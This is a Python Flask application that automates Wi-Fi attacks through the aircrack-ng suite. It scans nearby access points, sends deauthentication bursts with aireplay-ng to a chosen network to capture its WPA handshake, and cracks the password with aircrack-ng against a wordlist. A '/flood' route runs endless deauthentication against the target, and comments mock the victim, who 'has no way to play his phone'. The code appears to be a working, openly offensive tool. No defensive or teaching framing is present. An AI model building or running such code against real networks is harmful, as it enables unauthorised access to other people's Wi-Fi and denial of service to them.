import pywifi
import sys
import time
from pywifi import *
import subprocess
import threading
from flask import Flask
from flask import *
import os

app = Flask(__name__)
CH = 1
BS = ""

#these is the args of each AP
BSSID = ['BSSID']
SSID = ['SSID']
CHs = ['CH']
SIGNAL = ['SIGNAL']
a = 1
b = 1
c = 999
# to in case the wlan0 is still open
def in_case():
    subprocess.Popen("airmon-ng stop wlan0mon", shell = True, stdout = None)
    time.sleep(2.5)

#this part is the pywifi to get the around's AP
wifi=pywifi.PyWiFi()#创建一个无线对象
ifaces=wifi.interfaces()[0]#取第一个无限网卡


def diediedie(w, TIME):
    time.sleep(TIME)
    print("close the JT")
    QQQ = subprocess.Popen("airmon-ng stop wlan0mon", shell = True, stdout = None)
    QQQ.communicate()
    w.kill()


def gic():
    global wifi
    global ifaces
    print(ifaces.name())
    if ifaces in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        print("what's wrong ")
    else:
        print('ready')


def begin():
    subprocess.Popen("airmon-ng start wlan0", shell = True, stdout = None)
    time.sleep(2)
    q = subprocess.Popen("airodump-ng -w ~/cap/begin wlan0mon", shell = True, stdout = None)
    lueluelue(q)
    q.communicate()
    print("\n\n\n\n\n\n\n\n\nOVER!OVER!\n\n\n\n")
    
#it can read the file and return the args of the AP
#but now We abandon
def READ():
    f = open("begin-01.csv", "r")

    p = f.readlines()
    s = ''
    a = 0
    for item in p:
        if a > 1 and a < 22:
            s = s + str(item[0:17])
            s = s + "  "
            s = s + str(item[91:95])
            s = s + "   "
            s = s + str(item[61:63])
            s = s + "     "
            if str(item[90:90]) == ",":
                s = s + str(item[137:])
            else:
                s = s + str(item[134:])        
            s = s + "\n"
        a = a + 1
    return s
    
#make the freq change to the ch
def getCH(x):
    a = 6
    if x == 2412:
        a = 1
    if x == 2417:
        a = 2
    if x == 2422:
        a = 3
    if x == 2427:
        a = 4
    if x == 2432:
        a = 5
    if x == 2437:
        a = 6
    if x == 2442:
        a = 7
    if x == 2447:
        a = 8
    if x == 2452:
        a = 9
    if x == 2457:
        a = 10
    if x == 2462:
        a = 11
    if x == 2467:
        a = 12
    if x == 2472:
        a = 13
    if x == 2477:
        a = 14
    return a


#here is only to get the agrs of the AP
def first_bies():
    global a    
    global wifi
    global ifaces

    global BSSID
    global SSID
    global CHs    
    global SIGNAL    

    b = str(a)
    print('\n')
    ifaces.scan()
    time.sleep(0.5)
    bessis = ifaces.scan_results()
    print("Current Running WIFI List")
    for data in bessis:
        b = str(a)
        ch = getCH(data.freq)
        t = str(ch)
        print("%-2s"%b + ".Sianal " + str(data.signal)  + " BSSID--> " + data.bssid + "  CH:" + "%-2s"%t + " name: %-21s"%data.ssid )
        a = a + 1
        BSSID.append(data.bssid)
        SSID.append(data.ssid)
        CHs.append(ch)
        SIGNAL.append(data.signal)

def twice_bies():
    global a    
    global wifi
    global ifaces
    global b
    global BSSID
    global SSID
    global CHs    
    global SIGNAL    
    a = 1
    b = str(a)
    ifaces.scan()
    time.sleep(0.5)
    bessis = ifaces.scan_results()
    del BSSID[1:]
    del SSID[1:]
    del CHs[1:]
    del SIGNAL[1:]
    for data in bessis:
        b = str(a)
        ch = getCH(data.freq)
        t = str(ch)
        a = a + 1
        BSSID.append(data.bssid)
        SSID.append(data.ssid)
        CHs.append(ch)
        SIGNAL.append(data.signal)


#this part is to ensure the function append is successful
def ensure_bies(x):
    global BSSID
    global SSID
    global CHs    
    global SIGNAL    
    
    print("the AP you choose is ")
    t1 = str(CHs[x])
    t2 = str(SIGNAL[x])
    print(BSSID[x] + "  " + SSID[x] + "  " + t1 + "  " + t2)

#to choose which AP to attack
def which_to_attack():
    global a
    global b
    print("Which AP do you want to attack?")
    number_of_the_AP = input("The number of AP: ")
    #list indices must be integers or slices, not str
    number_of_the_AP = len(number_of_the_AP)
    b = number_of_the_AP
    ensure_bies(number_of_the_AP)

#Now we know the necessary args of the AP
#and this time we can used the aircrack-ng to attack the AP!

def T1_job():
    global BS
    global BSSID
    global b

    BS = BSSID[b]
    print("BS is " + BS)
    print("T1 start")
    print("T1 start")
    time.sleep(7.5)
    print(" attack!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print("object is " + BS)
    q = subprocess.Popen("aireplay-ng -0 15 -a " + BS +" wlan0mon", shell = True, stdout = subprocess.PIPE)
    print('over!!!!!over!!!!')
    print('over!!!!!over!!!!')


def kami():
    T1 = threading.Thread(target = T1_job)
    T1.start()


def CHOOSE():
    #this is the part to choose the --bssid and -c 
    global CH
    global BS
    print("waiting......")
    time.sleep(4)
    sys.stdout.flush()
    print("which one do you want to attack")
    print("input the BSSID")
    BS = input()
    print("You choose : " + BS)
    print("Input the CH of the AP:")
    CH = input()
    print("The CH you choose is the : " + CH)


def air():
    global BS
    global CH
    global a
    global b

    global BSSID
    global SSID
    global CHs    
    global SIGNAL
    t1 = str(CHs[b])
    BS = BSSID[b]
    #to ensure last time the monitor has stoped
    subprocess.Popen("airmon-ng stop wlan0mon", shell = True, stdout = None)
    time.sleep(2.5)
    subprocess.Popen("airmon-ng start wlan0", shell = True, stdout = None)
    time.sleep(2.5)
    
    kami()
    kami()
    kami()
    kami()
    kami()    
    
    w = subprocess.Popen("airodump-ng -c " + t1 + " --bssid " + BSSID[b] + " -w ~/cap/2.4G wlan0mon", shell = True, stdout = None)
    diediedie(w, 40)
    w.communicate()


def kami2(t1):
    subprocess.Popen("airmon-ng stop wlan0mon", shell = True, stdout = None)
    time.sleep(2.5)
    subprocess.Popen("airmon-ng start wlan0", shell = True, stdout = None)
    time.sleep(2.5)

    T3 = threading.Thread(target = T3_job)
    T3.start()

    kami()
    kami()
    kami()
    kami()
    kami()

    w = subprocess.Popen("airodump-ng -c " + t1 + " --bssid " + BSSID[b] + " -w ~/cap/2.4G wlan0mon", shell = True, stdout = None)
    diediedie(w, 35)
    w.communicate()


# wait 9s to monitor , diediedie is to wait 40s
def T3_job():
    LAST()


def AIR(AP_number):
    global BS
    global CH

    global BSSID
    global SSID
    global CHs    
    global SIGNAL
    
    t1 = str(CHs[AP_number])
    #to ensure last time the monitor has stoped
    kami2(t1)        
    

def last():
    subprocess.Popen("airmon-ng stop wlan0mon", shell = True, stdout = None)
    time.sleep(4)
    print("Wait a little time to translate the PS")
    w = subprocess.Popen("aircrack-ng -w ~/ps.txt ~/cap/2.4G-01.cap", shell = True, stdout = None)
    w.communicate()

#To prepare the last part 
def DIEDIEDIE(q):
    time.sleep(8)
    global c
    # success to get the WPA

    #poll's return:
    # 0 -> success to close
    # 1 -> sleep
    # 2 -> there isn't such a file be
    #-1 -> kill
    # None -> is still running 

    if q.poll() == None:
        print("SUCCESS TO GET THE WPA!")
        print("I'm running the password txt")
        print("And return the password as soon as")
        print("Don't worry ~ everything is OK")
        c = 1
    # Come to nothing to get the WPA
    if q.poll() == 0:
        print("come to get nothing to get WPA!")
        print("I will delect the last time file")
        print("Do you want to attack again?")
        c = 0
    else :
        print("ERROR")
        print("ERROR")
        print("ERROR")
        c = 2
    if q.poll() != None:
        q.kill()

# 13 second
def LAST():
    time.sleep(42)
    subprocess.Popen("airmon-ng stop wlan0mon", shell = True, stdout = None)
    time.sleep(2.5)
    print("Wait a little time to translate the PS")
    w = subprocess.Popen("aircrack-ng -w ~/ps.txt ~/cap/2.4G-01.cap", shell = True, stdout = None)
    DIEDIEDIE(w)
    w.communicate()

T = 0
#here is a threading operate
def death():
    global T
    global b

    T = 1
    while (T == 1) :
        kami()
        time.sleep(10)

def START_death():
    T6 = threading.Thread(target = death)
    T6.start()
    
#--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--
#--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--
#--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--
#--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--
#--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--Web--

d = 1

@app.route("/")
def ROOT():
    global BSSID
    global SSID
    global CHs    
    global SIGNAL    
    global a
    global b
    global d
    print("this is the :" + str(d) + "time you check")
    if d == 1:
        d = d + 1        
        return render_template('test.html', a = a, b = b, BSSID = BSSID, SSID = SSID, CHs = CHs, SIGNAL = SIGNAL) 
    else:
        d = d + 1
        twice_bies()
        return render_template('test.html', a = a, b = b, BSSID = BSSID, SSID = SSID, CHs = CHs, SIGNAL = SIGNAL) 

@app.route("/begin")
def BEGIN():
    in_case()
    begin()
    return READ()

@app.route("/guess")
def GUESS():
    return "Yes flask in running"

current = 0

@app.route("/attack/<int:AP_number>")
def what_happen(AP_number):
    global BSSID
    global SSID
    global CHs    
    global SIGNAL    
    global b
    global current
    b = AP_number
    current = AP_number
    return render_template('ensure.html', AP_number = AP_number, BSSID = BSSID[AP_number], SSID = SSID[AP_number], CHs = CHs[AP_number], SIGNAL = SIGNAL[AP_number])


@app.route("/monitor/<int:AP_number>")
def monitor(AP_number):
    T5 = threading.Thread(target = AIR, args = (AP_number, ))
    T5.start()
    return render_template('time.html')


# after 60s to check the WPA
# use the poll()
@app.route('/aircrack')
def AIRCRACK():
    global c
    
    # None -> 1
    # success to close -> 0
    # else error -> 2
        
    directory = "/root/cap/"
    os.chdir(directory)
    cwd = os.getcwd()
    files = os.listdir(os.getcwd())    
    
    if c == 1:
        return "SUCCESS and wait the aircrack "
        return render_template('poll1.html')
    if c == 0:
        for FILE in files:
            os.remove(FILE)
            print(FILE + " has been deleted")
        print("NO WPA")
        return render_template('poll2.html')
    if c == 2:
        for FILE in files:
            os.remove(FILE)
            print(FILE + " has been deleted")
        print("ERROR")
        return render_template('poll3.html')
    else:
        for FILE in files:
            os.remove(FILE)
            print(FILE + " has been deleted")
        c = str(c)
        return "%s"%c
        


def DEATH_MORE():
    while(1):
        T7 = threading.Thread(target = START_death)
        T7.start()
        time.sleep(75)
    #HE HAVE NO WAY TO PLAY HIS PHONE!
    #HAHAHAHAHA!~


@app.route('/flood')
def DEATH():
    T8 = threading.Thread(target = DEATH_MORE)
    T8.start()
    return  "I'm attacking and he has no changes to play his phone!hhhhhhhhhh~~~~~"


@app.route('/flood/over')
def OVER_death():
    global T
    T == 0
    return "xxx"

@app.route('/return_to_index')
def Return_to_index():
    global current
    AP_number = current
    return render_template('return_to_index.html', AP_number = AP_number, BSSID = BSSID[AP_number], SSID = SSID[AP_number], CHs = CHs[AP_number], SIGNAL = SIGNAL[AP_number])

def main():
    first_bies()
    #which_to_attack()
    #in_case()
    #begin()
    #READ()    
    #CHOOSE()
    #air()
    #last()
    

if __name__ == "__main__":
    main()
    app.run(debug = True, host = '0.0.0.0', port = 5000)
